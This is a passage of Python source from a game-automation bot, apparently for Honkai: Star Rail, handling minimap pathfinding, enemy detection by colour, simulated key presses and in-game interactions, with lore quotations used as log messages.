                break
            if self.mini_state>1:
                key_mouse_manager.keyUp("move_w")
                key_mouse_manager.wait()
            self.get_screen()
            have_f=self.check("interact", mask=MASK["interact_icon"], threshold=0.96)
            if not have_f:
                CUS_LOGGER.info("「但倘若黎明从一开始就不存在……」")
                key_mouse_manager.keyDown("move_w")
            if have_f:
                key_mouse_manager.keyUp("move_w")
                key_mouse_manager.press("interact")
                CUS_LOGGER.info('「那就让怒火燃尽此身，化作明日的烈阳！」')
                self.stop_move=1
                need_confirm = 1
                if self.nof(must_be='event'):
                    self.should_update_map = False
                    return
                break
            if not self.is_run():
                key_mouse_manager.keyUp("move_w")
                self.stop_move = 1
                self.should_update_map = False
                key_mouse_manager.wait()
                CUS_LOGGER.info("响应：「一道无足轻重的伤疤。」")
                return
            if time.time()-init_time>run_wait_time:
                CUS_LOGGER.warning("警告：等待时间超时,"+("不" if not self.has_target else "")+"存在「毁灭」目标")
                self.stop_move=1
                key_mouse_manager.keyUp("move_w")
                self.mini_state+=2
                if self.mini_state>=7:
                    # self.last_interact_time = 0
                    self.should_update_map = False
                    # key_mouse_manager.press('esc')
                    # key_mouse_manager.wait()
                    # self.update_state("ui")
                    return
                if self.has_target:
                    key_mouse_manager.press("move_s",0.3)
                    key_mouse_manager.press("move_a",0.7)
                    key_mouse_manager.press("move_d",0.45)
                    key_mouse_manager.press("move_w",0.5)
                    if self.mini_state==3:
                        key_mouse_manager.click_point(960, 540)
                    key_mouse_manager.wait()
                break
        self.stop_move=1
        key_mouse_manager.keyUp("move_w")
        self.update_state("check")
        if not self.is_run():
            self.should_update_map = False
            return
        first_find=self.first_mini
        if need_confirm or self.has_target:
            CUS_LOGGER.info(f"{factor}会坚守。直到有人前来打破这漫长的轮回，为翁法罗斯的命运添上结尾。")
            for i in "sasddwwaa":
                if self._stop:
                    self.should_update_map = False
                    return
                self.get_screen()
                if self.target_type==1:
                    CUS_LOGGER.info("沿着他们的足迹……写下前所未有的结局。")
                    if self.check("interact", mask=MASK["interact_icon"], threshold=0.96):
                        key_mouse_manager.press("interact",force= True)
                        if self.nof(must_be='event'):
                            self.should_update_map = False
                            return
                        else:
                            key_mouse_manager.press("interact")
                            if self.nof(must_be='event'):
                                self.should_update_map = False
                                return
                if (self.is_find_end==1 or first_find) and self.mini_state > 2:
                    first_find=False
                    if self.move_to_end(mode=0,device=1):
                        i = "w"
                elif self.move_to_event():
                    i="w"
                elif self.move_direct_to_text():
                    i="w"
                if self.check("interact", mask=MASK["interact_icon"], threshold=0.96):
                    key_mouse_manager.press("interact",force= True)
                    if self.nof(must_be='event'):
                        self.should_update_map = False
                        return
                    else:
                        key_mouse_manager.press("interact")
                        if self.nof(must_be='event'):
                            self.should_update_map = False
                            return
                key_mouse_manager.press(f"move_{i}", 0.25)
                CUS_LOGGER.debug(f"向{i}走0.25秒")
                key_mouse_manager.wait()
            key_mouse_manager.click_point(960, 540)
            self.should_update_map = False
    def get_rest_only_minimap(self):
        """
        self.mini_state 含义
        0: 初始状态
        1: 寻路中状态
        3: 接近目标点状态
        >=7: 完成一轮寻路
        """
        CUS_LOGGER.info("「那个身影燃烧自己……但也燃尽周围所有的一切……」")
        self.should_update_map=True
        ThreadWithException(target=self.auto_update_map,name="更新地图").start()
        if self.debug:
            CUS_LOGGER.debug(f'当前状态{self.mini_state}')
        #打补给罐子
        if self.mini_state==1:
            key_mouse_manager.press("move_w",0.55)
            key_mouse_manager.click_point(960, 540)
            key_mouse_manager.press("move_w")
            key_mouse_manager.wait()
        self.stop_move=0
        self.ready=0
        self.is_target = 0
        self.moving_direct=False
        self.has_target=True
        self.is_find_end = 0
        self.get_screen()
        first = self.first_mini
        CUS_LOGGER.info("在一片死寂中，那形如焦炭的熟悉身影踽踽独行，朝着漫无止尽的黑暗走去。")
        self.target_type = -1
        if not self.move_to_event(rest=True):
            CUS_LOGGER.info("梦中，太阳坠落，英雄的造像崩塌，融化，碎裂，将世界烧成一片灰烬。")
            self.has_target=False
            if self.mini_state > 2:
                CUS_LOGGER.info(f"{factor}不会知晓这趟旅程有多遥远，直到成为熊熊燃烧的薪柴，去壮大那徒劳的火焰。")
                self.is_find_end = self.move_to_end(mode=2,device=1)
                self.has_target = bool(self.is_find_end)
                if self.has_target:
                    self.target_type = 4
            CUS_LOGGER.info("请回头吧，别将你那荒谬又不公的命运付诸实现。")
        else:
            self.has_target=True
            self.target_type = 2
        key_mouse_manager.keyDown("move_w")
        run_wait_time = 2
        self.first_mini = 0
        self.is_sprinting = 0
        if self.has_target:
            run_wait_time+=5
        if self.mini_state==1:
            run_wait_time += 2
            sprint()
            self.is_sprinting = 1
        need_confirm=0
        init_time = time.time()
        while True:
            key_mouse_manager.wait()
            CUS_LOGGER.info(f"{factor}拒绝了「死亡」：他将灵魂化为烈火…为了将那「毁灭」的神像焚烧殆尽。")
            if self._stop == 1:
                key_mouse_manager.keyUp("move_w")
                self.stop_move=1
                break
            if self.mini_state > 1:
                key_mouse_manager.keyUp("move_w")
                key_mouse_manager.wait()
            self.get_screen()
            have_f=self.check("interact", mask=MASK["interact_icon"], threshold=0.96)
            if not have_f:
                CUS_LOGGER.info("醒醒…迷途者啊……看清那黑暗中的火光…并非……")
                key_mouse_manager.keyDown("move_w")
            if have_f:
                if self.mini_state <=1:
                    key_mouse_manager.keyUp("move_w")
                CUS_LOGGER.info(" 火焰尚有缺欠。必须…助长火焰。")
                judge, use_time = self.good_f()
                if judge and not (self.ts.similar("黑塔") and time.time() - self.quit < 30):
                    CUS_LOGGER.info("哪怕…要将这副身躯焚毁……")
                    if not self.ts.similar("黑塔"):
                        CUS_LOGGER.info("不管付出多少口舌，结局都不会改变。")
                    else:
                        self.quit = time.time()
                        self.mini_state += 2
                    key_mouse_manager.keyUp("move_w")
                    key_mouse_manager.press("interact")
                    key_mouse_manager.press("move_s", use_time)
                    self.stop_move = 1
                    key_mouse_manager.wait()
                    need_confirm = 1
                    self.should_update_map = False
                    if self.nof():
                        CUS_LOGGER.info("做出你们最大的努力抗争，或是接受命运，将火种交给他……")
                        key_mouse_manager.keyUp("move_w")
                        self.should_update_map = False
                        return
                    break
                elif self.ts.similar("黑塔") and time.time() - self.quit < 30:
                    CUS_LOGGER.info("也许你所行的根本不是拯救的道路，只是单纯地把这世界拖入火海而已。")
                    key_mouse_manager.press("move_w")
                    self.mini_state += 2
                    self.should_update_map = False
                else:
                    CUS_LOGGER.info("你心底的救世主情结，已将你变得与你口中冷眼的神明并无区别。")
                    need_confirm=1
                    break
            if not self.is_run():
                key_mouse_manager.keyUp("move_w")
                self.stop_move = 1
                self.should_update_map = False
                key_mouse_manager.wait()
                CUS_LOGGER.info("那些你誓言要拯救的人子…如今在你眼里，他们的性命恐怕与蝼蚁无异吧？")
                return
            if time.time()-init_time>run_wait_time:
                CUS_LOGGER.warning("警告：等待时间超时,"+("不" if not self.has_target else "")+"存在「毁灭」目标")
                self.stop_move=1
                key_mouse_manager.keyUp("move_w")
                self.mini_state+=2
                if self.mini_state>=7:
                    # self.last_interact_time = 0
                    self.should_update_map = False
                    # key_mouse_manager.press('esc')
                    # key_mouse_manager.wait()
                    # self.update_state("ui")
                    return
                if self.has_target:
                    key_mouse_manager.press("move_s",0.3)
                    key_mouse_manager.press("move_a",0.7)
                    key_mouse_manager.press("move_d",0.45)
                    key_mouse_manager.press("move_w",0.5)
                    if self.mini_state==3:
                        key_mouse_manager.click_point(960, 540)
                    key_mouse_manager.wait()
                break
        self.stop_move=1
        key_mouse_manager.keyUp("move_w")
        self.update_state("check")
        if not self.is_run():
            self.should_update_map = False
            return
        if need_confirm or self.has_target:
            CUS_LOGGER.info("你的冷漠令我心寒。他们对你而言，只是一堆无足轻重的注脚？")
            for i in "sasddwwaa":
                if self._stop:
                    self.should_update_map = False
                    return
                self.get_screen()
                if self.target_type==2:
                    CUS_LOGGER.info("可是，告诉我……若当真如此，我们又为何会步入相同的结局？")
                    if self.good_f(run=False)[0]:
                        key_mouse_manager.press("interact",force= True)
                        if self.nof(must_be='event'):
                            self.should_update_map = False
                            self.mini_state+=2
                            return
                if (self.is_find_end==1 or first) and self.mini_state > 2:
                    if self.move_to_end(mode=0,device=1):
                        i="w"
                elif self.move_to_event(rest=True):
                    i="w"
                if self.good_f(run=False)[0]:
                    key_mouse_manager.press("interact",force= True)
                    if self.nof(must_be='event'):
                        self.should_update_map = False
                        return
                key_mouse_manager.press(f"move_{i}", 0.25)
                CUS_LOGGER.debug(f"向{i}走0.25秒")
                key_mouse_manager.wait()
            key_mouse_manager.click_point(960, 540)
            self.should_update_map = False
    def get_shop_only_minimap(self):
        """
        self.mini_state 含义
        0: 初始状态
        1: 寻路中状态
        3: 接近目标点状态
        >=7: 完成一轮寻路
        """
        CUS_LOGGER.info("「汝将肩负骄阳…直至…」")
        self.should_update_map=True
        ThreadWithException(target=self.auto_update_map,name="更新地图").start()
        if self.debug:
            CUS_LOGGER.debug(f'当前状态{self.mini_state}')
        self.stop_move=0
        self.ready=0
        self.is_target = 0
        self.moving_direct=False
        self.has_target=True
        self.is_find_end = 0
        self.get_screen()
        first = self.first_mini
        CUS_LOGGER.info("那就去吧，卡厄斯兰那。如你约定的那般：欺骗世界，夺得火种，扭转命运……")
        self.target_type = -1
        if not self.move_to_shop():
            CUS_LOGGER.info(f"那些源自本心的坚持和选择，{factor}不相信它们是所谓「命途」的设计……")
            self.has_target=False
            if self.mini_state > 2:
                CUS_LOGGER.info("奋力地燃烧自己，以徒劳为剑，反抗神明吧——")
                key_mouse_manager.wait()
                self.is_find_end = self.move_to_end(mode=2,device=1)
                self.has_target = bool(self.is_find_end)
                if self.has_target:
                    self.target_type = 4
            CUS_LOGGER.info("…你害怕了吗？在了解到自己的本源后……")
        else:
            self.has_target=True
            self.target_type = 2
            if self.mini_state > 2:
                CUS_LOGGER.info(f"你会将「我」给予你的动力，视作「毁灭」蛊惑人心的低语吗？(当前状态{self.mini_state})")
                key_mouse_manager.wait()
                self.is_find_end = self.move_to_end(mode=2,device=1)
                self.has_target = bool(self.is_find_end)
                if self.has_target:
                    self.target_type = 4
        key_mouse_manager.keyDown("move_w")
        run_wait_time = 4
        self.first_mini = 0
        self.is_sprinting = 0
        if self.mini_state==1:
            run_wait_time += 1.8
            sprint()
            self.is_sprinting = 1
        need_confirm=0
        init_time = time.time()
        while True:
            key_mouse_manager.wait()
            CUS_LOGGER.info(f"每一个人的愿望…{factor}都铭记在心。")
            if self._stop == 1:
                key_mouse_manager.keyUp("move_w")
                self.stop_move=1
                break
            if self.mini_state > 1:
                key_mouse_manager.keyUp("move_w")
                key_mouse_manager.wait()
            self.get_screen()
            have_f=self.check("interact", mask=MASK["interact_icon"], threshold=0.96)
            if not have_f:
                CUS_LOGGER.info("听好，自往日而来的救世主——请回头吧——勿要惊扰它们，那众多鲜花的如泥死亡。")
                key_mouse_manager.keyDown("move_w")
            if have_f:
                if self.mini_state<=1:
                    key_mouse_manager.keyUp("move_w")
                CUS_LOGGER.info(f"{factor}…从未抛弃过。")
                judge, use_time = self.good_f()
                if judge and not (self.ts.similar("黑塔") and time.time() - self.quit < 30):
                    CUS_LOGGER.info("相比炽盛的神火，人性的部分…实在微小。")
                    if not self.ts.similar("黑塔"):
                        CUS_LOGGER.info("空洞的火焰，无法拯救任何人……")
                    else:
                        self.quit = time.time()
                        self.mini_state += 2
                    key_mouse_manager.keyUp("move_w")
                    key_mouse_manager.press("interact")
                    key_mouse_manager.press("move_s", use_time)
                    self.stop_move = 1
                    key_mouse_manager.wait()
                    need_confirm = 1
                    self.should_update_map = False
                    if self.nof():
                        CUS_LOGGER.info("…将这团火递给下一个我……无数次…无数次…无数次。")
                        key_mouse_manager.keyUp("move_w")
                        self.should_update_map = False
                        return
                    break
                elif self.ts.similar("黑塔") and time.time() - self.quit < 30:
                    CUS_LOGGER.info("你自己…无数个你自己的愿望…又是什么呢？")
                    key_mouse_manager.press("move_w")
                    self.mini_state += 2
                    self.should_update_map = False
                else:
                    CUS_LOGGER.info("当你毫无怨言地…背负起世界的时候……属于你的「自我」，就无法诞生了啊。")
                    need_confirm=1
                    break
            if not self.is_run():
                key_mouse_manager.keyUp("move_w")
                self.stop_move = 1
                self.should_update_map = False
                key_mouse_manager.wait()
                CUS_LOGGER.info("你已无力为继了…半神。把火种，交给我。让你我…尽快结束痛苦。")
                return
            if time.time()-init_time>run_wait_time:
                CUS_LOGGER.warning("警告：等待时间超时,"+("不" if not self.has_target else "")+"存在「毁灭」目标")
                self.stop_move=1
                key_mouse_manager.keyUp("move_w")
                self.mini_state+=2
                if self.mini_state>=7:
                    # self.last_interact_time = 0
                    self.should_update_map = False
                    # key_mouse_manager.press('esc')
                    # key_mouse_manager.wait()
                    # self.update_state("ui")
                    return
                if self.has_target:
                    key_mouse_manager.press("move_s",0.3)
                    key_mouse_manager.press("move_a",0.7)
                    key_mouse_manager.press("move_d",0.45)
                    key_mouse_manager.press("move_w",0.5)
                    if self.mini_state==3:
                        key_mouse_manager.click_point(960, 540)
                    key_mouse_manager.wait()
                break
        self.stop_move=1
        key_mouse_manager.keyUp("move_w")
        self.update_state("check")
        if not self.is_run():
            self.should_update_map = False
            return
        if need_confirm or self.has_target:
            CUS_LOGGER.info("再骄盛的太阳，也有遍照不到的地方。")
            for i in "sasddwwaa":
                if self._stop:
                    self.should_update_map = False
                    return
                self.get_screen()
                if self.target_type==2:
                    CUS_LOGGER.info("……直到，逆转「再创世」揭示的残酷未来。")
                    if self.good_f(run=False)[0]:
                        key_mouse_manager.press("interact",force= True)
                        key_mouse_manager.keyUp("move_w")
                        if self.nof(must_be='event'):
                            self.should_update_map = False
                            return
                if (self.is_find_end==1 or first) and self.mini_state > 2:
                    if self.move_to_end(mode=0,device=1):
                        i="w"
                elif self.move_to_shop():
                    i="w"
                if self.good_f(run=False)[0]:
                    key_mouse_manager.press("interact",force= True)
                    if self.nof(must_be='event'):
                        self.should_update_map = False
                        return
                key_mouse_manager.press(f"move_{i}", 0.25)
                CUS_LOGGER.debug(f"向{i}走0.25秒")
                key_mouse_manager.wait()
            key_mouse_manager.click_point(960, 540)
            self.should_update_map = False
    def get_path_only_minimap(self,fixed=False):
        """
        self.mini_state 含义
        0: 初始状态
        1: 寻路中状态
        3: 接近目标点状态
        >=7: 完成一轮寻路
        """
        CUS_LOGGER.info("走下去…背负这个世界…直到…灰白的英雄…无名的救世主…带来黎明……")
        if self.debug:
            CUS_LOGGER.debug(f'当前状态{self.mini_state}')
        self.should_update_map=True
        ThreadWithException(target=self.auto_update_map,name="更新地图").start()
        self.stop_move=0
        self.ready=0
        self.is_target = 0
        self.moving_direct=False
        self.has_target=True
        CUS_LOGGER.info(f"PhiLia093已经拥抱了她的命运……而{factor}，也会投身自己的本源——「毁灭」。")
        self.target_type = -1
        if self.initial_angle is None:
            rotation, direction = self.pos_predictor.update_minimap_data(self.get_screen())
            if direction is not None and rotation is not None:
                self.initial_angle = rotation
                CUS_LOGGER.debug(f"记录当前区域初始视角：{self.initial_angle}度")
        if not self.move_to_red_point():
            CUS_LOGGER.info("想反悔就反悔，孩子们总是幸福的……可属于大人的命运，从来没有回头的选择。")
            self.has_target=False
        if not self.check("z", mask=MASK["monster_info"],threshold=0.95,fresh=True) and not self.has_target:
            ThreadWithException(
                target=self.move_direct_thread,
                kwargs={"device": 1, "initial_angle": self.initial_angle},
                name="移动",
            ).start()
            while not self.ready:
                time.sleep(0.1)
        key_mouse_manager.keyDown("move_w")
        run_wait_time = 2
        self.first_mini = 0
        self.is_sprinting = 0
        if self.has_target:
            run_wait_time+=3
        if self.mini_state==1:
            run_wait_time += 1
            sprint()
            self.is_sprinting = 1
            #事件
            if self.target_type!=3:
                run_wait_time += 0.8
        need_confirm=0
        init_time = time.time()
        while True:
            CUS_LOGGER.info(f"{factor}以「愤怒」铭记此世的全部。只要{factor}还在燃烧，他们就从未离去。")
            if self._stop == 1:
                key_mouse_manager.keyUp("move_w")
                self.stop_move=1
                break
            if self.has_target:
                key_mouse_manager.keyUp("move_w")
                key_mouse_manager.wait()
            self.get_screen()
            have_f=self.check("interact", mask=MASK["interact_icon"], threshold=0.96)
            if not have_f:
                CUS_LOGGER.info(f"{factor}的悲伤从未消逝。恰恰相反，火种加诸此身，他心中的火焰前所未有地暴烈……")
                key_mouse_manager.keyDown("move_w")
            elif have_f:
                CUS_LOGGER.info(f"然后，{factor}杀死了自己。")
                key_mouse_manager.press("interact")
                self.stop_move = 1
                key_mouse_manager.wait()
                need_confirm = 1
                CUS_LOGGER.debug('等待验证交互文本 ' + self.ts.text)
                if self.nof("tp"):
                    CUS_LOGGER.info(f"而后，{factor}在这次轮回中的一切努力，也会在同一时间化为泡影。")
                    key_mouse_manager.keyUp("move_w")
                    self.should_update_map = False
                    if not self.is_run():
                        return
                break
            if self.check("auto_2",1808,997):
                CUS_LOGGER.info("「逐火是不断失却的旅途，在那一切当中，生命也微不足惜。」")
                key_mouse_manager.keyUp("move_w")
                self.stop_move=1
                self.mini_state+=2
                key_mouse_manager.wait()
                return
            if self.check("z", mask=MASK["monster_info"],threshold=0.95):
                CUS_LOGGER.info("「付之一炬」…多么熟悉的结局。它也出现在每一段旅途里，始终如一。")
                self.stop_move=1
                iters = 0
                while self.check("z", mask=MASK["monster_info"],threshold=0.95,fresh=True) and not self._stop:
                    CUS_LOGGER.info("「羁客」与「学士」兑现了他们的命运，再一次。")
                    key_mouse_manager.keyUp("move_w")
                    iters+=1
                    if iters>4:
                        break
                    red = [47, 47, 232]
                    rd = np.where(
                        np.sum((mask_minimap_outside(get_minimap(self.screen, radius=MINIMAP_RADIUS,copy=True), center_radius=80) - red) ** 2, axis=-1) <= self.red_threshold)
                    if not rd[0].shape[0]:
                        rd = np.where(np.sum((get_minimap(self.screen, radius=MINIMAP_RADIUS,copy=True,rotation=True) - red) ** 2, axis=-1) <= self.red_threshold)
                        if rd[0].shape[0] > 0:
                            # 仅检测存在性，不需要排序，使用第一个检测到的点
                            target = ((rd[1][0], rd[0][0]), 3)
                            self.get_screen()
                            ds=self.update_direction_data(mode=2,target=target)
                            if not ds:
                                break
                        else:
                            #没扫到红点，却有z的怪物标识，那红点可能被蓝色箭头挡住了，说明很近了
                            ds=0
                        if ds>28:
                            key_mouse_manager.keyDown("move_w")
                            if self.is_sprinting:
                                wait_time = (ds - 22.0) / 12
                                CUS_LOGGER.debug(f"距离目标{ds},太远，等待{(ds - 22.0) / 12}秒(冲刺)")
                            else:
                                wait_time = (ds - 22.0) / 8
                                CUS_LOGGER.debug(f"距离目标{ds},太远，等待{(ds - 22.0) / 8}秒")
                            now=time.time()
                            while time.time()-now<wait_time:
                                self.get_screen()
                                if predict(self.screen, enemy=True, item=False)['enemy'] is not None:
                                    CUS_LOGGER.info(f"或者，兑现命运的不止他们。只是{factor}已记不清了。")
                                    if self.debug:
                                        self.save_screen(not_now=True, save_path=os.path.join(PATHS["temp"], "kill"))
                                    break

                    if self.quan:
                        key_mouse_manager.keyUp("move_w")
                        skill_num=match_skill_numbers_in_region(self.get_screen())
                        if skill_num is not None:
                            self.skill_num=skill_num
                        if self.skill_num==0:
                            fixed=True
                        self.use_e(fixed=fixed)
                        if self.floor not in [4, 8, 13]:
                            for _ in range(2):
                                self.use_e(fixed=fixed)
                            self.stop_move=1
                            self.mini_state+=2
                            self.should_update_map = False
                            return
                        else:
                            key_mouse_manager.keyDown("move_w")
                    elif self.bai_e:
                        skill_num = match_skill_numbers_in_region(self.get_screen())
                        if skill_num is not None:
                            self.skill_num = skill_num
                        if self.skill_num <= 1:
                            fixed = True
                        self.use_e(face=True,fixed=fixed)
                        self.stop_move = 1
                        self.mini_state += 2
                        key_mouse_manager.press("move_w")
                        self.should_update_map = False
                        return
                    else:
                        key_mouse_manager.click_point(960, 540)
                    if iters + self.quan == 2:
                        key_mouse_manager.press("move_d",0.85)
                        key_mouse_manager.press("move_a",0.3)
                self.mini_state+=2
                break
            if not self.is_run():
                key_mouse_manager.keyUp("move_w")
                self.stop_move = 1
                self.should_update_map = False
                key_mouse_manager.wait()
                CUS_LOGGER.info("哪怕是微不足道的注脚，也会在故事里留下自己的印记。")
                return
            if time.time()-init_time>run_wait_time:
                CUS_LOGGER.warning("警告：等待时间超时,"+("不" if not self.has_target else "")+"存在「毁灭」目标")
                self.stop_move=1
                key_mouse_manager.keyUp("move_w")
                if self.mini_state>=7:
                    # self.last_interact_time = 0
                    self.should_update_map = False
                    # key_mouse_manager.press('esc')
                    # key_mouse_manager.wait()
                    # self.update_state("ui")
                    return
                self.mini_state+=2
                break
        self.stop_move=1
        key_mouse_manager.keyUp("move_w")
        self.update_state("check")
        if not self.is_run():
            self.should_update_map = False
            return
        if self.state=="run" and need_confirm:
            CUS_LOGGER.info("哪怕只是徒劳，你们…我们，都有选择的权利。")
            for i in "sasddwwaa":
                if self._stop:
                    self.should_update_map = False
                    return
                self.get_screen()
                if self.check("interact", mask=MASK["interact_icon"], threshold=0.96,fresh=True):
                    key_mouse_manager.keyUp(f"move_{i}")
                    key_mouse_manager.wait()
                    key_mouse_manager.press("interact")
                    self.get_screen()
                    if self.nof():
                        self.should_update_map = False
                        return
                if self.is_find_end==1 and self.mini_state > 2:
                    if self.move_to_end(mode=0,device=1):
                        key_mouse_manager.press("move_w")
                        key_mouse_manager.wait()
                elif self.move_direct_to_text():
                    i="w"
                else:
                    self.restore_initial_angle(self.initial_angle)
                    if self.check("interact", mask=MASK["interact_icon"], threshold=0.96,fresh=True):
                        key_mouse_manager.keyUp(f"move_{i}")
                        key_mouse_manager.wait()
                        key_mouse_manager.press("interact")
                        self.get_screen()
                        if self.nof():
                            self.should_update_map = False
                            return
                key_mouse_manager.press(f"move_{i}", 0.25)
                CUS_LOGGER.debug(f"向{i}走0.25秒")
                key_mouse_manager.wait()
            key_mouse_manager.click_point(960, 540)
            self.should_update_map = False
    def move_direct_to_text(self):
        find=False
        self.moving_direct = True
        for k in [0, 90, 90, 90, 45, -90, -90, -90, -45]:
            pos = get_text_position(self.get_screen())
            if pos:
                CUS_LOGGER.debug(
                    f"检测到文字候选{pos}，取最左侧{pos[0]}，距中心点{960 - pos[0][0]}，进行旋转"
                )
                key_mouse_manager.turn((pos[0][0] - 960) / 16.5)
                find=True
                key_mouse_manager.wait()
                break
            key_mouse_manager.turn(-k)
            key_mouse_manager.wait()
        self.moving_direct = False
        if not find:
            CUS_LOGGER.debug("旋转一周未检测到文字")
        return find
    def use_e(self,face=False,fixed=False):
        if not fixed:
            if self.quan:
                key_mouse_manager.press("technique",force= True)
                key_mouse_manager.wait()
            elif self.bai_e:
                CUS_LOGGER.info(f"「{factor}」施放【莫因舍弃而哭泣】")
                if face:
                    key_mouse_manager.press("technique",force= True)
                else:
                    key_mouse_manager.press("move_s")
                    key_mouse_manager.press("technique")
                    key_mouse_manager.wait()
                    key_mouse_manager.sleep(1.6)
                    key_mouse_manager.press("move_w")
                    key_mouse_manager.press("technique")
            else:
                key_mouse_manager.press("technique")
            key_mouse_manager.wait()
        else:
            key_mouse_manager.click_point(960, 540)
            key_mouse_manager.wait()


    def get_path_with_big_map(self,fixed=False):
        """
        np.array颜色为（b,g,r)
        """
        if fixed:
            CUS_LOGGER.info("「汝将肩负骄阳，直至灰白的黎明显著。」")
        else:
            CUS_LOGGER.info("『然而逐火是不断失却的旅途，在那一切当中，生命也当如尘埃般渺小。』")
        self.get_loc(False)
        self.get_screen()
        self.target_loc, self.target_type = self.get_recent_target()
        now_distance = self.update_direction_data()
        if not now_distance:
            CUS_LOGGER.warning("惟有…助长火焰。方能烧熔…那绝望的未来。")
            return
        if not self._stop:
            key_mouse_manager.keyDown("move_w")
            key_mouse_manager.wait()
        self.is_sprinting = 0
        if self.target_type != 3:
            sprint()
            self.is_sprinting = 1
        if not self.get_loc():
            CUS_LOGGER.warning("金血…出自「毁灭」。我们早已失去…奢求温暖的权利。")
            return False
        # 复杂的定位、寻路过程
        go_direct = 2
        go_time = random.uniform(0.5, 0.75)
        retry_time = 0
        has_not_found_red = False
        skill_num = match_skill_numbers_in_region(self.get_screen())
        if skill_num is not None:
            self.skill_num = skill_num
        if self.skill_num == 0:
            fixed = True
        if self.trust_annotated_attack_targets:
            add_round = 0
        elif not fixed:
            if self.bai_e:
                add_round = 7
            elif self.quan:
                add_round = 4
            else:
                add_round = 0
        else:
            add_round=0
        threshold_distance = [13, 19 + add_round, 11, 7]
        # 基于距离的位置卡住检测
        last_locs = []
        STUCK_DISTANCE_THRESHOLD = 2.0  # 卡住判定的距离阈值
        for i in range(30):
            CUS_LOGGER.debug(f"第{i}次定位寻路")
            if self._stop == 1:
                key_mouse_manager.keyUp("move_w")
                return
            else:
                key_mouse_manager.keyDown("move_w")
            # 预判实际点位
            if not self.get_loc():
                CUS_LOGGER.warning("它理应照亮众人，照亮前路，照亮翁法罗斯终将到来的黎明……")
                return
            if self.target_type == 1 and not self.trust_annotated_attack_targets:
                red = [47, 47, 232]
                CUS_LOGGER.info(f"{factor}的前路将是光明，和永恒不熄的烈火。")
                outside = mask_minimap_outside(get_minimap(self.screen, radius=MINIMAP_RADIUS, copy=True),
                                               center_radius=85)
                rd = np.where(
                    np.sum((outside - red) ** 2, axis=-1) <= self.red_threshold)
                if rd[0].shape[0]:
                    # 就在旁边
                    CUS_LOGGER.info("毁灭的太阳，已然成双……")
                    break
                now_distance = get_dis(self.now_loc, self.target_loc)
                if now_distance < 20:
                    CUS_LOGGER.info("让它点燃你的血液…你的愤怒…！")
                    CUS_LOGGER.debug(f"距离小于20,开始清除{(self.target_loc, 1)}从{self.target}")
                    self.target.remove((self.target_loc, 1))
                    rd = np.where(
                        np.sum((get_minimap(self.screen, radius=MINIMAP_RADIUS, copy=True,
                                            rotation=True) - red) ** 2, axis=-1) <= self.red_threshold)
                    if rd[0].shape[0] > 0:
                        CUS_LOGGER.info("还不够……以此身祭火…燃烧下去…！来…让怒火吞噬…！或成为此世…下一座焦碑…！")
                        # 创建所有检测到的敌人坐标的列表
                        enemy_coords = []
                        for i in range(len(rd[0])):
                            enemy_x, enemy_y = rd[1][i], rd[0][i]
                            new_loc = re_get_position(self.now_loc)
                            world_x = new_loc[0] + (enemy_x - 93)*POSITION_MINIMAP_SCALE
                            world_y = new_loc[1] + (enemy_y - 93)*POSITION_MINIMAP_SCALE
                            new_loc = re_get_position((world_x, world_y), re=True)
                            enemy_coords.append((new_loc, (enemy_x, enemy_y)))

                        # 按距离self.now_loc排序，最近的在前面
                        enemy_coords.sort(key=lambda coord: get_dis(coord[0], self.now_loc))
                        # 选择最近的敌人作为目标
                        nearest_world_coord, nearest_local_coord = enemy_coords[0]
                        recent_loc = tuple(nearest_world_coord)
                        CUS_LOGGER.debug(f"当前目标集合{self.target}")
                        self.target.add((recent_loc, 1))
                        self.target_loc = recent_loc
                        CUS_LOGGER.info(
                            f"{factor}以这力量反抗它的造主，为席卷世间的黑暗，带去无尽的怒火：{recent_loc}，共检测到{len(enemy_coords)}个敌人，按距离排序")
                    else:
                        CUS_LOGGER.info(f"真是如出一辙啊，就像{factor}过去认识的许多个他们……既狡猾…又天真。")
                        if self.debug:
                            self.save_screen(not_now=True, save_path=os.path.join(PATHS["temp"], "no_red2"))
                        has_not_found_red = True
                        # self.target_loc, type = self.get_recent_target()
                    if has_not_found_red:
                        CUS_LOGGER.info("就让天空…熔合此世全部痛苦吧。")
                        break
            elif self.target_type != 1 and not self.trust_annotated_attack_targets:
                red = [47, 47, 232]
                outside = mask_minimap_outside(get_minimap(self.screen, radius=MINIMAP_RADIUS, copy=True),
                                               center_radius=85)
                rd = np.where(
                    np.sum((outside - red) ** 2, axis=-1) <= self.red_threshold)
                if rd[0].shape[0]:
                    # 就在旁边
                    self.red_threshold *= 0.7
                    CUS_LOGGER.debug(f"无妨，就让这轮烈阳……用金色的火焰…填满天空。下次「毁灭」阈值{self.red_threshold}")
                    self.target_type = 1
                    break
            now_distance = get_dis(self.now_loc, self.target_loc)
            CUS_LOGGER.debug(
                f"当前距离目标点{self.target_loc}距离为{now_distance}阈值{threshold_distance[self.target_type]}")
            if now_distance > threshold_distance[self.target_type]:
                CUS_LOGGER.info("我必须出发…必须背负。我必须和你告别，然后…继续以「毁灭」对抗「毁灭」。")
                self.update_direction_data(mode=1)
            else:
                CUS_LOGGER.info(f"{factor}的火焰越燃越旺，{factor}开始变得无比接近…纯粹的愤怒，恨意的化身。")
                if self.target_type == 0:
                    self.target.remove((self.target_loc, self.target_type))
                    CUS_LOGGER.debug("已到达路径点" + str((self.target_loc, self.target_type)))
                    self.last_interact_time = time.time()
                    self.target_loc, self.target_type = self.get_recent_target()
                    if self.target_type == 3:
                        sprint()
                        self.is_sprinting = 0
                    go_direct = 2
                else:
                    key_mouse_manager.keyUp("move_w")
                    break
            CUS_LOGGER.info(f"但黑潮的阴影依旧笼罩，痛苦和绝望遍布在遥远的大地……(目标距离{now_distance})")
            # 检查是否位置卡住（连续3次距离过小）
            last_locs.append(self.now_loc)
            if len(last_locs) > 3:
                last_locs.pop(0)
            # 判断是否卡住：连续3个位置间距离都小于阈值
            is_stuck = False
            if len(last_locs) == 3:
                dist1 = get_dis(last_locs[0], last_locs[1])
                dist2 = get_dis(last_locs[1], last_locs[2])
                dist3 = get_dis(last_locs[0], last_locs[2])
                is_stuck = (dist1 < STUCK_DISTANCE_THRESHOLD and
                            dist2 < STUCK_DISTANCE_THRESHOLD and
                            dist3 < STUCK_DISTANCE_THRESHOLD)
            # 距离没有更近 或者 位置卡住：开始尝试绕过障碍
            if is_stuck:
                CUS_LOGGER.debug(f"自身坐标{self.now_loc}，目标坐标{self.target_loc}")
